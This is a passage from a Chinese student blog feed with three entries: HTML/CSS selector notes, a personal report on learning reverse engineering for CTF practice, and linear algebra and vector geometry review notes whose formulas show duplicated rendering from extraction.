class="hljs-string">&quot;路径&quot;</span>/&gt;</span><br><span class="hljs-comment">&lt;!--内部样式表--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span> &gt;</span>...<span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br></code></pre></td></tr></table></figure><hr><h2 id="元素的id和class">元素的id和class</h2><h3 id="id属性-P126">id属性( P126 )</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;content&quot;</span>&gt;</span><br>    ...<br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;content&quot;</span>&gt;</span><br>    ...<br><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="class属性-P127">class属性( P127 )</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;content&quot;</span>&gt;</span><br>    ...<br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;content&quot;</span>&gt;</span><br>    ...<br><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br></code></pre></td></tr></table></figure><hr><h2 id="CSS选择器">CSS选择器</h2><h3 id="元素选择器-P129-130">元素选择器( P129-130 )</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span>&gt;</span><span class="css"></span><br><span class="css">    <span class="hljs-selector-tag">div</span>&#123;<span class="hljs-attribute">color</span>:red;&#125;</span><br><span class="css"></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><br>    ...<br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="id选择器-P130-131">id选择器( P130-131 )</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span>&gt;</span><span class="css"></span><br><span class="css">    <span class="hljs-selector-id">#lvye</span>&#123;<span class="hljs-attribute">color</span>:red;&#125;</span><br><span class="css"></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;lvye&quot;</span>&gt;</span><br>    ...<br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="class选择器-P132-133">class选择器( P132-133 )</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span>&gt;</span><span class="css"></span><br><span class="css">    <span class="hljs-selector-class">.lvye</span>&#123;<span class="hljs-attribute">color</span>:red;&#125;</span><br><span class="css"></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;lvye&quot;</span>&gt;</span><br>    ...<br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="后代选择器-P134-135">后代选择器( P134-135 )</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span>&gt;</span><span class="css"></span><br><span class="css">    <span class="hljs-selector-id">#father1</span> <span class="hljs-selector-tag">div</span>&#123;<span class="hljs-attribute">color</span>:red;&#125;</span><br><span class="css">    <span class="hljs-selector-id">#father2</span> <span class="hljs-selector-tag">span</span>&#123;<span class="hljs-attribute">color</span>:blue;&#125;</span><br><span class="css"></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;father1&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><br>        ...<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;father2&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>...<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="群组选择器-P135-138">群组选择器( P135-138 )</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span>&gt;</span><span class="css"></span><br><span class="css">    <span class="hljs-selector-tag">p</span>,<span class="hljs-selector-tag">div</span>&#123;<span class="hljs-attribute">color</span>:red;&#125;</span><br><span class="css"></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><br>    ...<br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><br>    ...<br><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="盒子模型-P214">盒子模型( P214 )</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span>&gt;</span><span class="css"></span><br><span class="css">    <span class="hljs-selector-tag">div</span>&#123;</span><br><span class="css">        <span class="hljs-attribute">display</span>:inline-block;<span class="hljs-comment">/*将块元素转换为inline-block元素*/</span></span><br><span class="css">        <span class="hljs-attribute">padding</span>:<span class="hljs-number">20px</span>;</span><br><span class="css">        <span class="hljs-attribute">margin</span>:<span class="hljs-number">40px</span>;</span><br><span class="css">        <span class="hljs-attribute">border</span>:<span class="hljs-number">2px</span> solid red;</span><br><span class="css">        <span class="hljs-attribute">background-color</span>:<span class="hljs-number">#ffdead</span>;</span><br><span class="css">    &#125;</span><br><span class="css"></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><br>    ...<br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://www.runoob.com/images/box-model.gif" alt=""></p><h2 id="其他-2">其他</h2><figure class="highlight tp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs tp">CSS概念 <span class="hljs-keyword">P</span><span class="hljs-number">122</span><br>选择器概念 <span class="hljs-keyword">P</span><span class="hljs-number">127</span><br>字体样式 <span class="hljs-keyword">P</span><span class="hljs-number">139</span><br>CSS注释 <span class="hljs-keyword">P</span><span class="hljs-number">148</span><br>文本样式 <span class="hljs-keyword">P</span><span class="hljs-number">152</span><br>边框样式 <span class="hljs-keyword">P</span><span class="hljs-number">163</span><br>列表样式 <span class="hljs-keyword">P</span><span class="hljs-number">171</span><br>表格样式 <span class="hljs-keyword">P</span><span class="hljs-number">177</span><br>图片样式 <span class="hljs-keyword">P</span><span class="hljs-number">183</span><br>背景样式 <span class="hljs-keyword">P</span><span class="hljs-number">192</span><br>超链接样式 <span class="hljs-keyword">P</span><span class="hljs-number">203</span><br>鼠标样式 <span class="hljs-keyword">P</span><span class="hljs-number">208</span><br>浮动布局 <span class="hljs-keyword">P</span><span class="hljs-number">230</span><br>定位布局 <span class="hljs-keyword">P</span><span class="hljs-number">240</span><br>CSS常用属性 <span class="hljs-keyword">P</span><span class="hljs-number">252</span><br>WSC 十六色 <span class="hljs-keyword">P</span><span class="hljs-number">254</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>School Learning</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>阶段性学习(摸鱼)报告</title>
    <link href="/2022/03/14/%E9%98%B6%E6%AE%B5%E6%80%A7%E5%AD%A6%E4%B9%A0(%E6%91%B8%E9%B1%BC)%E6%8A%A5%E5%91%8A/"/>
    <url>/2022/03/14/%E9%98%B6%E6%AE%B5%E6%80%A7%E5%AD%A6%E4%B9%A0(%E6%91%B8%E9%B1%BC)%E6%8A%A5%E5%91%8A/</url>
    
    <content type="html"><![CDATA[<h2 id="前言-（-摸-鱼-部-分-）">前言~~（  摸  鱼  部  分  ）~~</h2><p>by：一个摸鱼摸了将近一个暑假后找到学习方向的蒟蒻的经历。</p><p>与许多人一样都是整日无所事事，突然有种度日如年的滋味。感觉奋苦读书后收获的的竟是百般无聊，在暑期我加入了各个实验室，看着都是加入的人，但是没有几个真正开始学习的，都沉浸在没有作业的一个暑期中~~（我也是）~~。摸了几个月的鱼，终于等到开学了，才开始发现学习的重要。</p><p>本以为自己能够凭借原有的C++基础就开始继续划水一学期的时候，我接触到了Re。也看到了许多没有在起跑线上获得优势的同学奋力奔跑的身影，这也让我感到一丝不安。而这也促使了我开始逆向学习。</p><h2 id="正文部分">正文部分</h2><p>刚刚接触逆向的时候，满头的雾水，这个是什么？那个是什么？</p><p>犹记得刚刚开始入门的时候对着一个陌生的程序捣鼓，为什么按 F5 打不开伪代码，为什么我的界面和公众号上面的不一样，这个是什么界面？带着一个个的问题，终于我到实验室去了。</p><p>在学长 SR 的帮助下，拿到了一个<code>IDA PRO 7.5</code>的压缩包才算是真正打开了Re学习的大门。</p><h3 id="学习部分">学习部分</h3><h4 id="IDA的使用">IDA的使用</h4><p>刚刚拿到IDA之后便开始了对IDA操作的摸索，学过C++的我看着一个个熟悉的字母变成了一个个陌生的符号。对着公众号一步步的操作，我逐渐明白了IDA的大致食用方法。<s>（我还没入门，快来带我）</s></p><p>在第一次按下F5时看着陌生的汇编语言转换成了C的伪代码，不禁发出多声感叹。我终于可以开始学习啦！</p><p>也收获在层层代码中找到那一行<code> flag&#123;you_find_it_haha&#125;</code>时的喜悦。</p><h4 id="编程语言">编程语言</h4><p>在选择Re前我便有一定的编程基础，我曾经自学过C++，但出于时间久远的问题有部分遗忘  <s>（毕 竟 谁 没 事 在 高 中 写 那 些）</s>，</p><p>在Re的学习中我也遇到了反编译 <code>.pyc</code>看着一个个库，不仅感叹Python的便捷也悔恨自己不会Python的事实。于是我也踏上了Python的学习。</p><p>对于目前写脚本主要以C++为主，虽然麻烦了些，但也是乐在其中。</p><h4 id="加密算法">加密算法</h4><p>目前遇到过Base 64、变种 Base 64、RC4、Rabbit加密算法，对其中的题目也有一定自己的理解，能够识别出一些加密方式。</p><p><s>还是不会写加密解密，在线网站YYDS</s></p><p>目前还在努力的学习Base家族以及其他经典加密算法，努力的认识它们，辨识出来它们。</p><h4 id="虚拟机">虚拟机</h4><p>虚拟机部分尝试安装了Ubuntu，Kali，但是在IDA对<code>.elf</code>的调试还是没能成功，被莫名的系统Bug限制了！！</p><p><s>（ 企 图 抓 一 个 学 长 来 干 活 ）</s></p><p>同时在Linux系统下，也在努力学习其终端指令   <s>（ 好 多 ）</s></p><h4 id="练习部分">练习部分</h4><p>写完了入门的T系，也练完了S类，做过迷宫、Win框架下的应用程序~~（基本不会，入口都找不到）~~、apk的简易逆向（<s>签到题</s>）、一些反编译<code>.pyc</code>、<code>.class</code>。</p><p>目前在buuctf上面练习，同时也搭建了自己的博客，上面写一些自己的wp~~（基本处于摸鱼状态，GIthub没梯子太难受了）~~</p><h2 id="最后的话-（-一-些-废-话-）">最后的话~~（  一  些  废  话  ）~~</h2><p>感谢一下The_Itach1这位学长~~（ 不 会 题 目 解 决 器 ，丢 过 去 自 动 就 解 决 了 ，真 是 神 奇 呢 ~ ）~~</p><p>学习Re还是要多练练手，可以去刷一写题目，像迷宫这个就有点依赖于做相同类型题目的经验，可以去多学一些加密方式~~（我自己都没学多少）~~，听某个大佬鼠说可以试着自己去写程序然后拖进IDA，也可以去试试看吧，但我感觉更多情况下出的题目大多都是经过优化的，伪代码的可读性会更好一点，最后多多努力，终会发光的！</p><p>​</p><h3 id="By：-梓曰">By： 梓曰</h3>]]></content>
    
    
    <categories>
      
      <category>Summary</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>线性代数复习要点</title>
    <link href="/2022/03/14/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E5%A4%8D%E4%B9%A0%E8%A6%81%E7%82%B9/"/>
    <url>/2022/03/14/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E5%A4%8D%E4%B9%A0%E8%A6%81%E7%82%B9/</url>
    
    <content type="html"><![CDATA[<h1>General</h1><p><img src="https://5b0988e595225.cdn.sohucs.com/images/20181211/d093d1be23444673a1ebadf0c004de4b.png" alt=""></p><p><img src="https://5b0988e595225.cdn.sohucs.com/images/20181211/cf7140bc63014ed68e5d7bf28591cfaa.jpeg" alt=""></p><p><img src="http://5b0988e595225.cdn.sohucs.com/images/20181211/2be60c1db47e4d869980c09d33a1e10d.jpeg" alt=""></p><p><img src="http://5b0988e595225.cdn.sohucs.com/images/20181211/1b733ca3376b4fea84ea6d28a0429e34.jpeg" alt=""></p><p><img src="http://5b0988e595225.cdn.sohucs.com/images/20181211/2bef2905605f49e28ce3d632f3309e6d.jpeg" alt=""></p><p><img src="http://5b0988e595225.cdn.sohucs.com/images/20181211/975e636b396f40099bad19d8c03d3a8f.jpeg" alt=""></p><p><img src="http://5b0988e595225.cdn.sohucs.com/images/20181211/57a3bf1136f84d618ccd20bdf7e80a0a.jpeg" alt=""></p><p><img src="http://5b0988e595225.cdn.sohucs.com/images/20181211/f3464533fca14264b194ae080d30d8a1.jpeg" alt=""></p><p><img src="http://5b0988e595225.cdn.sohucs.com/images/20181211/16b2ebb4a4f74a54845c68a7d984c379.jpeg" alt=""></p><p><img src="http://5b0988e595225.cdn.sohucs.com/images/20181211/68a8e91ebc0341439d0078140a94b66e.jpeg" alt=""></p><p><img src="http://5b0988e595225.cdn.sohucs.com/images/20181211/9108adf2a45d47dcb57947a10d1f6bc2.jpeg" alt=""></p><p><img src="http://5b0988e595225.cdn.sohucs.com/images/20181211/3838efee76aa42ce8133502241014c17.jpeg" alt=""></p><p><img src="http://5b0988e595225.cdn.sohucs.com/images/20181211/38bd22900b6d4f99a14a51aba72a22c2.jpeg" alt=""></p><p><img src="http://5b0988e595225.cdn.sohucs.com/images/20181211/5b198c737230471b836f771528ecebe3.jpeg" alt=""></p><p><img src="http://5b0988e595225.cdn.sohucs.com/images/20181211/a96a6f619a7647199172a346fcb10790.jpeg" alt=""></p><blockquote><p>**转自：**<a href="http://www.sohu.com/a/280972453_600110?spm=smpc.csrpage.news-list.8.1553583042078HOcihqa">http://www.sohu.com/a/280972453_600110?spm=smpc.csrpage.news-list.8.1553583042078HOcihqa</a></p><p><strong>配套教材：同济版：线性代数(第五版)，<strong>来源于</strong>武汉大学数学与统计学院信息与计算科学系黄正华</strong>老师个人网页</p></blockquote><h1>Extend</h1><h2 id="向量代数与空间几何初步">向量代数与空间几何初步</h2><h3 id="向量代数">向量代数</h3><h4 id="向量及其表示">向量及其表示</h4><ul><li><p>矢量、标量</p><ul><li>向量的表示</li><li>向量相等：模、方向</li><li>单位向量、自由向量</li><li>向量的平行、共线、共面</li></ul></li><li><p>向量的运算</p><ul><li><p>加法</p><ul><li>三角形法则<ul><li>向量不等式：|a\pm b|\leq|a|+|b|∣a±b∣≤∣a∣+∣b∣</li><li>交换律，结合律</li></ul></li></ul></li><li><p>数乘</p><ul><li><p>分配律、结合律</p></li><li><p>共线定理：</p><p>aa</p><p>，</p><p>bb</p><p>共线等价于</p><p>a =kba=kb</p><ul><li>线性相关（共线）、线性无关（不共线）</li></ul></li></ul></li></ul></li><li><p>正交标架与向量坐标</p><ul><li>右手规则</li></ul></li><li><p>卦限：在 zz 轴下方的是在 zz 轴上方卦限 +4</p><ul><li><p>向径：\vec{ow}ow</p><ul><li><p>向径公式：坐标分解式 \vec r=x\vec i+y\vec j+z\vec kr=xi+yj+zk</p></li><li><p>投影向量：x\vec{i}xi 、 y\vec{j}yj 、z\vec{k}zk</p></li><li><p>向量坐标：</p><p>(x,y,z)(x,y,z)</p><ul><li>共线：相应坐标成比例</li></ul></li><li><p>点分公式：\vec{AM}=\lambda \vec{MB}AM=λMB，MM 在 \vec {AB}AB 上，则 \vec{OM}=\frac{\vec{OA}+\lambda\vec{OB}}{1+\lambda}OM=1+λOA+λOB</p></li></ul></li><li><p>模与方向角</p><ul><li><p>方向余弦：</p><p>(\cos \alpha, \cos \beta, \cos \gamma)=\left(\frac{x}{|a|}, \frac{y}{|a|}, \frac{z}{|a|}\right)=\frac{a}{|a|}=a^{0}(cosα,cosβ,cosγ)=(∣a∣x,∣a∣y,∣a∣z)=∣a∣a=a0</p><ul><li>余弦公式：\cos ^{2} \alpha+\cos ^{2} \beta+\cos ^{2} \gamma=1cos2α+cos2β+cos2γ=1</li></ul></li></ul></li><li><p>向量在轴上的投影</p><ul><li><p>投影向量</p></li><li><p>投影（数）：\operatorname{Prj}<em>{u} \boldsymbol{a}=\lambda,Prju<strong>a</strong>=λ, 或记 (\boldsymbol{a})</em>{u}=\lambda(<strong>a</strong>)u=λ</p></li><li><p>向量的投影具有下列性质:（设</p><p>\varphiφ</p><p>为向量</p><p>\boldsymbol{a}<strong>a</strong></p><p>与</p><p>uu</p><p>轴的夹角 )</p><ol><li>(\boldsymbol{a})<em>{u}=|\boldsymbol{a} | \cos \varphi \quad\left(\right.(<strong>a</strong>)u=∣<strong>a</strong>∣cosφ( 即 \left.\operatorname{Prj}</em>{u} \boldsymbol{a}=|\boldsymbol{a}| \cos \varphi\right)Prju<strong>a</strong>=∣<strong>a</strong>∣cosφ)</li><li>(\boldsymbol{a}+\boldsymbol{b})<em>{u}=(\boldsymbol{a})</em>{u}+(\boldsymbol{b})_{u}(<strong>a</strong>+<strong>b</strong>)u=(<strong>a</strong>)u+(<strong>b</strong>)u</li><li>(\lambda \boldsymbol{a})<em>{u}=\lambda(\boldsymbol{a})</em>{u}(λ<strong>a</strong>)u=λ(<strong>a</strong>)u</li></ol></li></ul></li></ul></li><li><p>向量内积：\boldsymbol{a} \cdot \boldsymbol{b}=|\boldsymbol{a}||\boldsymbol{b}| \cos \theta<strong>a</strong>⋅<strong>b</strong>=∣<strong>a</strong>∣∣<strong>b</strong>∣cosθ</p><ul><li>当 b \neq 0b=0 时， \boldsymbol a<strong>a</strong> 在 \boldsymbol b<strong>b</strong> 上的投影为(\boldsymbol{a})_{\boldsymbol{b}}=|\boldsymbol{a}| \cos \theta=\frac{\boldsymbol{a} \cdot \boldsymbol{b}}{|\boldsymbol{b}|}(<strong>a</strong>)<strong>b</strong>=∣<strong>a</strong>∣cosθ=∣<strong>b</strong>∣<strong>a</strong>⋅<strong>b</strong></li></ul></li><li><p>垂直条件：\boldsymbol{a} \perp \boldsymbol{b}\Leftrightarrow \boldsymbol{a} \cdot \boldsymbol{b}=0<strong>a</strong>⊥<strong>b</strong>⇔<strong>a</strong>⋅<strong>b</strong>=0</p><ul><li><p>正交分解：设 \boldsymbol{v} \neq \overrightarrow{0},<strong>v</strong>=0, 任一向量 \boldsymbol{a}<strong>a</strong> 有正交分解\boldsymbol{a}=k \boldsymbol{v}+\boldsymbol{a}^{\prime}, \quad \boldsymbol{a}^{\prime} \perp \boldsymbol{v}<strong>a</strong>=k<strong>v</strong>+<strong>a</strong>′,<strong>a</strong>′⊥<strong>v</strong></p></li><li><p>\boldsymbol{a}\cdot\boldsymbol{a}={|\boldsymbol{a}|}^{2}<strong>a</strong>⋅<strong>a</strong>=∣<strong>a</strong>∣2 ；{|\boldsymbol{a}\pm\boldsymbol{b}|}^{2}={|\boldsymbol{a}|}^{2}+{|\boldsymbol{b}|}^{2} \pm 2 \boldsymbol{a} \cdot \boldsymbol{b}∣<strong>a</strong>±<strong>b</strong>∣2=∣<strong>a</strong>∣2+∣<strong>b</strong>∣2±2<strong>a</strong>⋅<strong>b</strong></p></li><li><p>坐标运算：</p><p>\boldsymbol{a} \cdot\boldsymbol{b}=a_{1} b_{1}+a_{2} b_{2}+a_{3} b_{3}<strong>a</strong>⋅<strong>b</strong>=a1b1+a2b2+a3b3</p><ul><li>垂直、求余弦角</li></ul></li></ul></li><li><p>向量外积</p><ul><li>方向：右手定则</li><li>模：|\boldsymbol{a} \times \boldsymbol{b}|=|\boldsymbol{a} | \boldsymbol{b}| \sin \theta, \quad \theta=\angle(\boldsymbol{a}, \boldsymbol{b})∣<strong>a</strong>×<strong>b</strong>∣=∣<strong>a</strong>∥<strong>b</strong>∣sinθ,θ=∠(<strong>a</strong>,<strong>b</strong>) 为 \boldsymbol{a}, \boldsymbol{b}<strong>a</strong>,<strong>b</strong> 的夹角<ul><li>等于以 \boldsymbol a<strong>a</strong>, \boldsymbol b<strong>b</strong> 为邻边的平行四边形面积</li></ul></li><li><strong>反交换性</strong>：\boldsymbol{b} \times \boldsymbol{a}=-\boldsymbol{a} \times \boldsymbol{b}<strong>b</strong>×<strong>a</strong>=−<strong>a</strong>×<strong>b</strong></li><li>叉乘的坐标公式：\boldsymbol a\times \boldsymbol b=(\begin{vmatrix} a_2&amp;a_3 \  b_2&amp;b_3  \end{vmatrix},-\begin{vmatrix} a_1&amp;a_3 \  b_1&amp;b_3  \end{vmatrix},\begin{vmatrix} a_1 &amp; a_2\  b_1 &amp;b_2  \end{vmatrix})<strong>a</strong>×<strong>b</strong>=(∣∣∣∣a2b2a3b3∣∣∣∣,−∣∣∣∣a1b1a3b3∣∣∣∣,∣∣∣∣a1b1a2b2∣∣∣∣)</li></ul></li><li><p>混合积：(\boldsymbol a,\boldsymbol b, \boldsymbol c)=(\boldsymbol a \times \boldsymbol b)\cdot \boldsymbol c=\begin{vmatrix}a_1&amp;a_2&amp;a_3 \  b_1&amp;b_2&amp;b_3 \c_1&amp;c_2&amp;c_3\end{vmatrix}(<strong>a</strong>,<strong>b</strong>,<strong>c</strong>)=(<strong>a</strong>×<strong>b</strong>)⋅<strong>c</strong>=∣∣∣∣∣∣a1b1c1a2b2c2a3b3c3∣∣∣∣∣∣</p><ul><li><p>其绝对值等于以 \boldsymbol a,\boldsymbol b,\boldsymbol c<strong>a</strong>,<strong>b</strong>,<strong>c</strong> 为棱的平行六面体</p></li><li><p>{\boldsymbol a,\boldsymbol b,\boldsymbol c}{<strong>a</strong>,<strong>b</strong>,<strong>c</strong>} 组成右手系时为正，反之为负</p></li><li><p>(\boldsymbol a,\boldsymbol b, \boldsymbol c)=(\boldsymbol b, \boldsymbol c,\boldsymbol a)=(\boldsymbol c,\boldsymbol a, \boldsymbol b)(<strong>a</strong>,<strong>b</strong>,<strong>c</strong>)=(<strong>b</strong>,<strong>c</strong>,<strong>a</strong>)=(<strong>c</strong>,<strong>a</strong>,<strong>b</strong>)</p></li><li><p>双重外积公式：</p><p>(\boldsymbol a \times \boldsymbol b)\times \boldsymbol c =(\boldsymbol a \cdot \boldsymbol c)\boldsymbol b -(\boldsymbol b \cdot \boldsymbol c )\boldsymbol a(<strong>a</strong>×<strong>b</strong>)×<strong>c</strong>=(<strong>a</strong>⋅<strong>c</strong>)<strong>b</strong>−(<strong>b</strong>⋅<strong>c</strong>)<strong>a</strong></p><p>\boldsymbol a \times(\boldsymbol b \times \boldsymbol c)=(\boldsymbol a \cdot \boldsymbol c)\boldsymbol b - (\boldsymbol a \cdot  \boldsymbol b )\boldsymbol c<strong>a</strong>×(<strong>b</strong>×<strong>c</strong>)=(<strong>a</strong>⋅<strong>c</strong>)<strong>b</strong>−(<strong>a</strong>⋅<strong>b</strong>)<strong>c</strong></p></li></ul></li></ul><h3 id="空间平面与直线">空间平面与直线</h3><h4 id="平面及其方程">平面及其方程</h4><h5 id="平面的点法式方程">平面的点法式方程</h5><ul><li>设 P(x, y, z)P(x,y,z) 是平面 \piπ 上任一点。那么向量 \vec{P}<em>{0} \vec{P}P0P 与法向量 nn 必垂直 \left(n \perp \overline{P</em>{0} P}\right),(n⊥P0P), 于是它们的内积等于零:</li></ul><p>n \cdot \overrightarrow{P_{0} P}=0 n⋅P0P=0</p><p>由于 n=(A, B, C), \quad \overrightarrow{P_{0} P}=\left(x-x_{0}, y-y_{0}, z-z_{0}\right), \quadn=(A,B,C),P0P=(x−x0,y−y0,z−z0), 则有</p><p>A\left(x-x_{0}\right)+B\left(y-y_{0}\right)+C\left(z-z_{0}\right)=0 A(x−x0)+B(y−y0)+C(z−z0)=0</p><p>这就是平面 \piπ 上任一点 PP 的坐标 (x, y, z)(x,y,z) 所满足的方程。</p><h5 id="平面的一般方程">平面的一般方程</h5><ul><li>Ax+By+Cz+D=0Ax+By+Cz+D=0<ul><li>(A,B,C)(A,B,C) 是平面法向量，利用这一点可以判断平面方程特性</li></ul></li><li>特殊的<ul><li>截距式方程：\frac{x}{a}+\frac{y}{b}+\frac{z}{c}=1ax+by+cz=1，a,b,ca,b,c 叫做平面在 x, y, zx,y,z 轴上的截距</li><li>三点式方程：\left|\begin{array}{ccc}x-x_{1} &amp; y-y_{1} &amp; z-z_{1} \ x_{2}-x_{1} &amp; y_{2}-y_{1} &amp; z_{2}-z_{1} \ x_{3}-x_{1} &amp; y_{3}-y_{1} &amp; z_{3}-z_{1}\end{array}\right|=0∣∣∣∣∣∣x−x1x2−x1x3−x1y−y1y2−y1y3−y1z−z1z2−z1z3−z1∣∣∣∣∣∣=0</li></ul></li></ul><h5 id="两平面的夹角">两平面的夹角</h5><ul><li><p>设平面 \Pi_{1}Π1 和 \Pi_{2}Π2 的法线向量依次为 n_{1}=\left(A_{1}, B_{1}, C_{1}\right)n1=(A1,B1,C1) 和 n_{2}=\left(A_{2}, B_{2}, C_{2}\right),n2=(A2,B2,C2), 那么两平面的夹角 \thetaθ 公式为</p><p>\cos \theta=\frac{\left|A_{1} A_{2}+B_{1} B_{2}+C_{1} C_{2}\right|}{\sqrt{A_{1}^{2}+B_{1}^{2}+C_{1}^{2}} \sqrt{A_{2}^{2}+B_{2}^{2}+C_{2}^{2}}} cosθ=A12+B12+C12A22+B22+C22∣A1A2+B1B2+C1C2∣</p></li><li><p>点到平面的距离：d=\frac{\left|A x_{0}+B y_{0}+C z_{0}+D\right|}{\sqrt{A^{2}+B^{2}+C^{2}}}d=A2+B2+C2∣Ax0+By0+Cz0+D∣</p></li></ul><h4 id="空间直线方程">空间直线方程</h4><h5 id="空间直线的一般方程">空间直线的一般方程</h5><ul><li>\left{\begin{array}{l}A_{1} x+B_{1} y+C_{1} z+D_{1}=0 \ A_{2} x+B_{2} y+C_{2} 